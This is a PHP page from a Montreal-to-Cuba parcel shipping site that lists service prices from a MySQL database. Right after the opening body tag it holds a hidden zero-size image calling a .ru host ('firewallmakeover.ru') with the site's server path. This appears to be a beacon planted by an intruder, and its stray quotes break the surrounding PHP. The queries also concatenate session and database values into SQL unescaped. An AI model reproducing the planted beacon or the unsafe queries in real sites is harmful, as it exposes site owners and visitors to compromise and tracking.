<?php
include('lib/config.php');

		// **** CONNECTION AU SERVEUR
		if( !($Connection = mysql_connect( $host, $user, $password )) ) {
			$Message = mysql_errno().$TabMessGen[30].mysql_error();
			AfficherErreur($Message);
		} // Connection au serveur			   
		if( !($db = mysql_select_db( $database, $Connection )) ) {
			$Message = mysql_errno().$TabMessGen[31].mysql_error();
			AfficherErreur($Message);
		} // Selection de la BD

		$sql = "SELECT Description_".$_SESSION['langue'].",Def FROM $database.services WHERE (Unite = 'POID/WEIGHT') OR (Unite = 'UNITÉ/UNIT')";
			
		$result = mysql_query( $sql, $Connection  );
		


echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='4' cellspacing='0' align='$Enligne' border='0' >";

?>
		<tr>
			<td valign='top'>
				<font color='#D00E29' size='3' face='verdana'><b>X-CRIBA</b></font><br/>
				<b><big><?=$txt['ecrivez_proches']?></b></big><br/><br/>
				<center><b><big><a href='xcriba.php'><?=$txt['envoyer_lettre_ligne']?></a></big></b></center><br/>
				<hr/><br/>
			</td>
		</tr>
		<tr>
			<td>
				<font color='#D00E29' size='3' face='verdana'><b><?=$txt['messagerie']?></b></font><br/>
				<p align="center">
					<marquee bgcolor="#FFFF00" height="23">
						<?=$txt['NOUVEAU']?>
					</marquee>
				</p>
				<center><b><big><a href='colis_calcul.php'><?=$txt['Chx_Envoi_Online']?></a></big></b><br/><br>
		 		<a href='formulaires/Envio_de_Dinero_y_Paquetes_<?=$_SESSION['langue']?>.pdf' target=_blank><b><?=$txt['model']?></b></a>
		 		</center><br><br>
				<b><big><?=$txt['envois_paquets1']?></b></big><br/><br/>
				<?=$txt['envois_paquets2']?><br/><br/>
				<?=$txt['service_profesionnel1']?><br/><br/>
<?php
				for( $i=0; $i < mysql_num_rows($result); $i++ ) {
					$row = mysql_fetch_row($result);
					if( strlen($row[1]) ) {
						echo "
						<table width'550' cellpadding='1' cellspacing='0' border='1' bordercolor='#9EA2AB' >";
						$sql2 = "SELECT QteMax, Fixe, Unite FROM $database.codeprix WHERE Code = '$row[1]'";
			
						$result2 = mysql_query( $sql2, $Connection  );
						if( ($result2 != 0 ) && mysql_num_rows($result2) != 0 ) {
	         			echo "
							<thead>
								<tr>";
		            	echo("<th width='340px' style='font-size=8px;'>&nbsp;</th>");
		            	$Nb = mysql_num_rows($result2);
							for( $j=0; $j < $Nb; $j++ ) {
								$row2 = mysql_fetch_row($result2);
								echo "<th width='100px'  style='font-size=12px;'>";
								echo $row2[0].'/'.$row2[2];
								echo "</th>";
							} // Pour chaque valeur du code de prix
	            		echo "
			            		</tr>
			            	</thead>";
			         }
						mysql_data_seek($result2, 0);
						if( ($result2 != 0 ) && mysql_num_rows($result2) != 0 ) {
			            echo "	
			            	<tbody>
									<tr>";
							if( strlen($row[0]) )
								echo("<td Valign='middle' align='center' >".$row[0]."</td> ");
							else
								echo("<td>&nbsp;</td> ");
							for( $j=0; $j < mysql_num_rows($result2); $j++ ) {
								$row2 = mysql_fetch_row($result2);
								if( strlen($row2[1]) )
									echo("<td Valign='middle' align='center' >".$row2[1]."</td> ");
								else
									echo("<td>&nbsp;</td> ");
							} // Pour chaque valeur du code de prix
							
	            		echo "
			            		</tr>
			            	</tbody>
							</table>";
						} // Si un code prix valide
					} // Si code pour le service	
				} // Pour chaque service
							
?>
				<br><br><?=$txt['service_profesionnel2']?><br><br>
				<b><?=$txt['effectuer_paiement1']?></b><br>
				<?=$txt['effectuer_paiement2']?><br><br>
				<b><?=$txt['assurer_envoi1']?></b><br>
				<?=$txt['assurer_envoi2']?><br><br>
				<b><?=$txt['envoyer_paquet1']?></b>
				<br><br>
				<?=$txt['envoyer_paquet2']?><br>
				<b><?=$param['nom_client']?></b><br>
				<?=$param['adresse_client']?><br>
				<?=$param['ville_client']?>,<?=$param['province_client']?><?=$param['pays_client']?><?=$param['codepostal_client']?><br>
				<br><br>
				<?=$txt['courrier_regulier']?><br><br>
			</td>
		</tr>
		<tr>
			<td valign='top'>
				<hr><br>
				<center>
					<a href='<?=$param['url_douane']?>' target='_blank'>
						<img src='images/aduana_cuba.jpg' border='0'/><br>
						<b><?=$txt['web_douanes']?></b>
					</a>
				</center>
			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
	
<script LANGUAGE="javascript">

function Rafraichie(){
			window.location.reload();
}

</script>

</body>
</html>

















